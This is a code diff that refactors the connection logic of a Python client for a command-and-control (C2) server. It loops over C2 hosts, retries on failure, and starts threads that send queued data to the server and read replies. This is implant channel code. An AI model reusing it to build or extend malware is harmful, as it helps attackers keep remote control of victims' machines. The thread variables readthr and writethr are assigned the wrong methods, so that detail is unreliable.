@@ -53,48 +53,34 @@ class Client:
 
     def connect(self, address, port):
         """Connect to C2 server."""
-        current_host = 0
         while not self.active.is_set():
-            try:
-                # create connection
-                address, port = C2_HOSTS[current_host].get("ip"), C2_HOSTS[current_host].get("port")
-                self.s = socket.create_connection((address, port))
-                self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-                self.logger.debug("Connected successfully to: {}".format(self.s.getpeername()))
-                self.active.set()
-                self.setup_IO()
-                break
-
-            except (socket.timeout, socket.error):
-                self.logger.debug("Unable to connect to {}:{}. Retrying in {} seconds...".format(address,
-                                                                                                 port,
-                                                                                                 C2_TIMEOUT))
-                time.sleep(C2_TIMEOUT)
-                if len(C2_HOSTS) > 1:
-                    current_host = current_host + 1
-                if current_host >= len(C2_HOSTS):
-                    current_host = 0
-                continue
-
-            except Exception as e:
-                self.logger.error("Socket error while connecting to server: {}".format(str(e)))
+            for c2 in C2_HOSTS:
                 try:
-                    self.s.close()
-                except socket.error:
-                    pass
-                self.active.clear()
-                continue
+                    address, port = c2.get("ip"), c2.get("port")
+                    self.s = socket.create_connection((address, port))
+                    self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                    self.logger.debug("Connected successfully to: {}".format(self.s.getpeername()))
+                    self.active.set()
+                    self.readthr = self.write()
+                    self.writethr = self.read()
+                    break
 
-    def setup_IO(self):
-        """Start read and write threads."""
-        self.readthr = threading.Thread(target=self.read)
-        self.readthr.daemon = False
-        self.readthr.start()
+                except (socket.timeout, socket.error):
+                    self.logger.debug("Unable to connect to {}:{}. Retrying in {} seconds...".format(address,
+                                                                                                     port,
+                                                                                                     C2_TIMEOUT))
+                    time.sleep(C2_TIMEOUT)
 
-        self.writethr = threading.Thread(target=self.write)
-        self.writethr.daemon = False
-        self.writethr.start()
+                except Exception as e:
+                    self.logger.error("Socket error while connecting to server: {}".format(str(e)))
+                    try:
+                        self.s.close()
+                    except socket.error:
+                        pass
+                    self.active.clear()
+                    continue
 
+    @threaded
     def write(self):
         """Pick data from write queue and send it to C2 server."""
         self.logger.info("Started write thread!")
@@ -127,6 +113,7 @@ class Client:
         logging.getLogger().removeHandler(self.queue_handler)
         self.logger.info("Stopped write thread!")
 
+    @threaded
     def read(self):
         """Wait and receive data and put it to read queue."""
         self.logger.info("Started read thread!")
